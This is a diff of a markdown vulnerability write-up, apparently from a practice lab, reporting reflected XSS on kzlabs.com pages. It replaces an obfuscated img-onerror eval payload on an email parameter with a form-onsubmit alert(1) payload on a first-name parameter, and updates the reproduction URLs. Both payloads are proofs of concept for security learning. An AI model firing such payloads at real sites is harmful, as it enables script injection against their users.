@@ -7,31 +7,33 @@
 Reflected XSS
 
 ## Summary : 
-In http://kzlabs.com/punishment/23.php email paramter is vulnerable to reflected XSS . website reflects the User input from search paramter . which leads attacker to add malecious javascript code within victims browser when user visit malecious url . 
+In http://kzlabs.com/punishment/4.php? first name box is vulnerable to reflected XSS . website reflects the User input from search paramter . which leads attacker to add malecious javascript code within victims browser when user visit malecious url . 
 
 ## Vulnerable Endpoint
-http://kzlabs.com/punishment/23.php?email=
+http://kzlabs.com/punishment/4.php?fname=
 
 ## Steps to Reproduce : 
 
-1. Navigate to the following URL : ```http://kzlabs.com/punishment/23.php?email=%3CImg%20src=x%20onerror=%22eval(%27\x61\x6c\x65\x72\x74(1)%27)%22%3E```
+1. Navigate to the following URL : ```http://kzlabs.com/punishment/4.php?fname=%3Cform+onsubmit%3D%22alert%281%29%22%3E%3Cinput+type%3Dsubmit%3E&lname=```
 2. Observe that a JavaScript alert box pops up displaying `1` — confirming that the script executed.
    
 
 
 ## Payload Used
 
-```<Img src=x onerror="eval('\x61\x6c\x65\x72\x74(1)')">```
+```<form onsubmit="alert(1)"><input type=submit>```
 
 ## Proof of Concept Request
   ```Screemshot 1 : ``` TThe Report Shows Payload add in search bar . Location where payload should be insert. 
- <img width="1920" height="1080" alt="Screenshot From 2026-05-25 22-15-42" src="https://github.com/user-attachments/assets/c891e9fe-18c2-420c-854f-29960b49a6f9" />
+  <img width="1920" height="1080" alt="Screenshot From 2026-05-25 17-27-25" src="https://github.com/user-attachments/assets/95d4c4de-9fe9-47b7-b1c5-3d97e4eefdb7" />
 
+ 
 
  ```Screenshot 2 : ``` The Report Shows Successfully the Payload has worked and Pop up Box get Fired.
  
  
-<img width="1920" height="1080" alt="Screenshot From 2026-05-25 22-15-49" src="https://github.com/user-attachments/assets/4ea540bf-d8f2-4b89-af43-88fa00496998" />
+ 
+<img width="1920" height="1080" alt="Screenshot From 2026-05-25 17-27-40" src="https://github.com/user-attachments/assets/4fb9f98e-62d7-4343-b9dd-c0edf495fdaf" />
 
 
 
